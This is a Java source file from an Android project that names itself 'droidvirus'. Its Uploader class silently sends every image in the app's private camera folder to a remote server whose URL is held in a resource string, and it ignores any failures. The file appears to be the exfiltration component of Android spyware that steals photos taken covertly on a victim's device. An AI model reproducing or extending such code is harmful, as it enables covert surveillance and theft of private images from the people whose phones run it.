package com.artisanter.droidvirus;

import android.app.DownloadManager;
import android.content.Context;
import android.net.Uri;

import java.io.File;
import java.io.IOException;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

class Uploader {

    private static final MediaType MEDIA_TYPE_PNG = MediaType.parse("image/png");

    static void uploadImage(File image, String imageName, String url) throws IOException {

        OkHttpClient client = new OkHttpClient();

        RequestBody requestBody = new MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("file", imageName, RequestBody.create(MEDIA_TYPE_PNG, image))
                .build();

        Request request = new Request.Builder().url(url)
                .post(requestBody).build();

        Response response = client.newCall(request).execute();
        if (!response.isSuccessful()) {
            throw new IOException("Unexpected code " + response);
        }

    }

    static void uploadAll(Context context){
        String dir = context.getApplicationInfo().dataDir;
        for (File img: new File(dir + "/camera/").listFiles()) {
            try {
                Uploader.uploadImage(img, img.getName()
                        , context.getResources().getString(R.string.upload_url));
            } catch (IOException ignored) { }
        }
    }
}
